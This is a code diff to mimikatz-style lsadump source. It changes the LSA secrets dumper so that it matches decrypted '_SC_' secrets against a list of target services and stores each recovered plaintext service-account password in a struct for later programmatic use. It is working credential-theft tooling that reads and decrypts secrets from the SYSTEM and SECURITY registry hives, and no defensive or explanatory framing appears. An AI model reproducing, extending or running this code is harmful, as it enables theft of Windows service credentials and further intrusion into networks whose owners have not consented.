@@ -123,7 +123,7 @@ BOOL kuhl_m_lsadump_getSids(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY hPolic
 	return status;
 }
 
-BOOL kuhl_m_lsadump_getLsaKeyAndSecrets(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY hSecurityBase, IN PKULL_M_REGISTRY_HANDLE hSystem, IN HKEY hSystemBase, IN LPBYTE sysKey, IN BOOL secretsOrCache, IN PKUHL_LSADUMP_DCC_CACHE_DATA pCacheData)
+BOOL kuhl_m_lsadump_getLsaKeyAndSecrets(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY hSecurityBase, IN PKULL_M_REGISTRY_HANDLE hSystem, IN HKEY hSystemBase, IN LPBYTE sysKey, IN BOOL secretsOrCache, IN PKUHL_LSADUMP_DCC_CACHE_DATA pCacheData, PSVC_STRUCT *svc_arr, IN size_t svc_arr_size )
 {
 	BOOL status = FALSE;
 	HKEY hPolicy;
@@ -200,7 +200,7 @@ BOOL kuhl_m_lsadump_getLsaKeyAndSecrets(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN
 		if(nt6keysStream || nt5key)
 		{
 			if(secretsOrCache)
-				kuhl_m_lsadump_getSecrets(hSecurity, hPolicy, hSystem, hSystemBase, nt6keysStream, nt5key);
+				kuhl_m_lsadump_getSecrets(hSecurity, hPolicy, hSystem, hSystemBase, nt6keysStream, nt5key, svc_arr, svc_arr_size);
 			else
 				kuhl_m_lsadump_getNLKMSecretAndCache(hSecurity, hPolicy, hSecurityBase, nt6keysStream, nt5key, pCacheData);
 		}
@@ -215,11 +215,11 @@ BOOL kuhl_m_lsadump_getLsaKeyAndSecrets(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN
 	return status;
 }
 
-BOOL kuhl_m_lsadump_getSecrets(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY hPolicyBase, IN PKULL_M_REGISTRY_HANDLE hSystem, IN HKEY hSystemBase, PNT6_SYSTEM_KEYS lsaKeysStream, PNT5_SYSTEM_KEY lsaKeyUnique)
+BOOL kuhl_m_lsadump_getSecrets(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY hPolicyBase, IN PKULL_M_REGISTRY_HANDLE hSystem, IN HKEY hSystemBase, PNT6_SYSTEM_KEYS lsaKeysStream, PNT5_SYSTEM_KEY lsaKeyUnique, PSVC_STRUCT *svc_arr, IN size_t svc_arr_size )
 {
 	BOOL status = FALSE;
 	HKEY hSecrets, hSecret, hCurrentControlSet, hServiceBase;
-	DWORD i, nbSubKeys, szMaxSubKeyLen, szSecretName, szSecret;
+	DWORD i, j, nbSubKeys, szMaxSubKeyLen, szSecretName, szSecret;
 	PVOID pSecret;
 	wchar_t * secretName;
 
@@ -239,21 +239,32 @@ BOOL kuhl_m_lsadump_getSecrets(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY hPo
 							szSecretName = szMaxSubKeyLen;
 							if(kull_m_registry_RegEnumKeyEx(hSecurity, hSecrets, i, secretName, &szSecretName, NULL, NULL, NULL, NULL))
 							{
+								PSVC_STRUCT cur_svc = NULL;
 								kprintf(L"\nSecret  : %s", secretName);
-
-								if(_wcsnicmp(secretName, L"_SC_", 4) == 0)
+								if(_wcsnicmp(secretName, L"_SC_", 4) == 0){
 									kuhl_m_lsadump_getInfosFromServiceName(hSystem, hServiceBase, secretName + 4);
+									for( j =0; j < svc_arr_size; j++){
+										if( _wcsnicmp(svc_arr[j]->service_name, secretName + 4, wcslen(svc_arr[j]->service_name)) == 0) {
+											cur_svc = svc_arr[j];
+											break;
+										}
+									}
+								}
+
+								//Goto the next one
+								if( cur_svc == NULL)
+									continue;
 
 								if(kull_m_registry_RegOpenKeyEx(hSecurity, hSecrets, secretName, 0, KEY_READ, &hSecret))
 								{
 									if(kuhl_m_lsadump_decryptSecret(hSecurity, hSecret, L"CurrVal", lsaKeysStream, lsaKeyUnique, &pSecret, &szSecret))
 									{
-										kuhl_m_lsadump_candidateSecret(szSecret, pSecret, L"\ncur/", secretName);
+										kuhl_m_lsadump_candidateSecret(szSecret, pSecret, L"\ncur/", secretName, cur_svc);
 										LocalFree(pSecret);
 									}
 									if(kuhl_m_lsadump_decryptSecret(hSecurity, hSecret, L"OldVal", lsaKeysStream, lsaKeyUnique, &pSecret, &szSecret))
 									{
-										kuhl_m_lsadump_candidateSecret(szSecret, pSecret, L"\nold/", secretName);
+										kuhl_m_lsadump_candidateSecret(szSecret, pSecret, L"\nold/", secretName, NULL);
 										LocalFree(pSecret);
 									}
 									kull_m_registry_RegCloseKey(hSecurity, hSecret);
@@ -635,7 +646,7 @@ BOOL kuhl_m_lsadump_decryptSecret(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY 
 	return status;
 }
 
-void kuhl_m_lsadump_candidateSecret(DWORD szBytesSecrets, PVOID bufferSecret, PCWSTR prefix, PCWSTR secretName)
+void kuhl_m_lsadump_candidateSecret(DWORD szBytesSecrets, PVOID bufferSecret, PCWSTR prefix, PCWSTR secretName, PSVC_STRUCT svc_struct )
 {
 	UNICODE_STRING candidateString = {(USHORT) szBytesSecrets, (USHORT) szBytesSecrets, (PWSTR) bufferSecret};
 	BOOL isStringOk = FALSE;
@@ -644,8 +655,16 @@ void kuhl_m_lsadump_candidateSecret(DWORD szBytesSecrets, PVOID bufferSecret, PC
 	{
 		kprintf(L"%s", prefix);
 		if(szBytesSecrets <= USHRT_MAX)
-			if(isStringOk = kull_m_string_suspectUnicodeString(&candidateString))
+			if(isStringOk = kull_m_string_suspectUnicodeString(&candidateString)){
 				kprintf(L"text: %wZ", &candidateString);
+				if( candidateString.Length > 0 && svc_struct != NULL ){
+					//Allocate memory for service name
+					unsigned int svc_pwd_buf_size =  candidateString.Length + 2;
+					wchar_t *svc_pwd_str = (wchar_t *)calloc(1, svc_pwd_buf_size );
+					memcpy(svc_pwd_str, candidateString.Buffer, svc_pwd_buf_size - 2);
+					svc_struct->service_password = svc_pwd_str;
+				}
+			}
 
 		if(!isStringOk)
 		{
@@ -744,7 +763,7 @@ BOOL kuhl_m_lsadump_sec_aes256(PNT6_HARD_SECRET hardSecretBlob, DWORD hardSecret
 	return status;
 }
 
-NTSTATUS kuhl_m_lsadump_secrets(LPCSTR szSystem, LPCSTR szSecurity)
+NTSTATUS kuhl_m_lsadump_secrets( PSVC_STRUCT *svc_arr, size_t svc_arr_size, LPCSTR szSystem, LPCSTR szSecurity)
 {
 	HANDLE hDataSystem, hDataSecurity;
 	PKULL_M_REGISTRY_HANDLE hSystem, hSecurity;
@@ -763,7 +782,7 @@ NTSTATUS kuhl_m_lsadump_secrets(LPCSTR szSystem, LPCSTR szSecurity)
 				{
 					if(kull_m_registry_open(KULL_M_REGISTRY_TYPE_HIVE, hDataSecurity, cacheData.username ? TRUE : FALSE, &hSecurity))
 					{
-						kuhl_m_lsadump_getLsaKeyAndSecrets(hSecurity, NULL, hSystem, NULL, sysKey, TRUE, &cacheData);
+						kuhl_m_lsadump_getLsaKeyAndSecrets(hSecurity, NULL, hSystem, NULL, sysKey, TRUE, &cacheData, svc_arr, svc_arr_size);
 						kull_m_registry_close(hSecurity);
 					}
 					CloseHandle(hDataSecurity);
@@ -774,7 +793,7 @@ NTSTATUS kuhl_m_lsadump_secrets(LPCSTR szSystem, LPCSTR szSecurity)
 		CloseHandle(hDataSystem);
 	} 
 	else {
-		printf("error CreateFile (SYSTEM hive) 0x%x\n", GetLastError());
+		printf("[-] Error CreateFile (SYSTEM hive) 0x%x\n", GetLastError());
 	}
 
 	return 0;
